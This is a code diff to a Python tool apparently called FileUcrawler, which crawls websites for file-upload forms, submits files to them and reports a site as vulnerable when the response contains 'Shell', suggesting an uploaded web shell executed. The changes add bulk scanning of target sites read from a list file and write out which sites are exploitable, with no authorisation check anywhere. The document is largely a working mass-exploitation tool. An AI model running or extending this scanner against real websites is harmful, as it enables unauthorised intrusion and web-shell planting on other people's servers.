@@ -2,6 +2,7 @@ import requests
 from bs4 import BeautifulSoup
 import urllib.parse
 import mimetypes
+import sys
 
 class FileUploadCrawler:
     def __init__(self, base_url):
@@ -72,9 +73,15 @@ class FileUploadTester:
                 'Content-Type': f'multipart/form-data; boundary={boundary}'
             }
 
-            request = requests.post(form_action, data=data, headers=headers)
-            if "Shell" in request.text:
-                print(f"Vulnerability found: {filename} uploaded and executed on {self.url}")
+            try:
+                response = requests.post(form_action, data=data, headers=headers)
+                if "Shell" in response.text:
+                    print(f"\033[91mVulnerability found: {filename} uploaded and executed on {self.url}\033[0m")
+                    return True
+            except Exception as e:
+                print(f"Error during file upload test: {e}")
+
+        return False
 
 def print_banner():
     banner = """
@@ -93,20 +100,57 @@ def print_banner():
 if __name__ == "__main__":
     print_banner()
 
-    base_url = input("Enter the base URL to start crawling: ").strip()
-    if not base_url.startswith(("http://", "https://")):
-        base_url = "https://" + base_url
+    if len(sys.argv) < 3 or len(sys.argv) > 5:
+        print("Usage: python FileUcrawler.py -l <websitelist.txt> [-o <outputfile.txt>]")
+        sys.exit(1)
 
-    crawler = FileUploadCrawler(base_url)
-    crawler.crawl_and_scan()
+    output_file = None
+    if '-o' in sys.argv:
+        output_index = sys.argv.index('-o')
+        output_file = sys.argv[output_index + 1]
+        sys.argv = sys.argv[:output_index] + sys.argv[output_index + 2:]
 
-    file_upload_pages = crawler.get_file_upload_pages()
-    if file_upload_pages:
-        print("\nFile upload forms found on the following pages:")
-        for page in file_upload_pages:
-            print(page)
-            tester = FileUploadTester(page)
-            for form_action in file_upload_pages:
-                tester.test_file_upload(form_action)
+    if sys.argv[1] == '-l':
+        try:
+            with open(sys.argv[2], 'r') as f:
+                urls = [line.strip() for line in f.readlines()]
+
+            found_urls = []
+            vulnerable_urls = []
+
+            for url in urls:
+                if not url.startswith(("http://", "https://")):
+                    url = "https://" + url
+                print(f"Checking website: {url}")
+                crawler = FileUploadCrawler(url)
+                crawler.crawl_and_scan()
+
+                file_upload_pages = crawler.get_file_upload_pages()
+                if file_upload_pages:
+                    found_urls.append(url)
+                    print(f"\033[93mFile upload found at the following pages for {url}:\033[0m")
+                    for page in file_upload_pages:
+                        print(f"  - {page}")
+                        tester = FileUploadTester(page)
+                        if tester.test_file_upload(page):
+                            vulnerable_urls.append(url)
+                else:
+                    print(f"No file upload form found at {url}\n")
+
+            if output_file:
+                with open(output_file, 'w') as f:
+                    f.write("Websites with file uploading found:\n")
+                    for url in found_urls:
+                        f.write(f"{url}\n")
+                    f.write("\nWebsites with potential vulnerabilities found:\n")
+                    for url in vulnerable_urls:
+                        f.write(f"{url}\n")
+
+            print("\n**FileUcrawler**")
+            print("Status: Completed")
+        except FileNotFoundError:
+            print("Error: The file specified does not exist.")
+            sys.exit(1)
     else:
-        print("\nNo file upload forms found on the website.")
+        print("Error: Invalid flag. Please use -l <websitelist.txt>")
+        sys.exit(1)
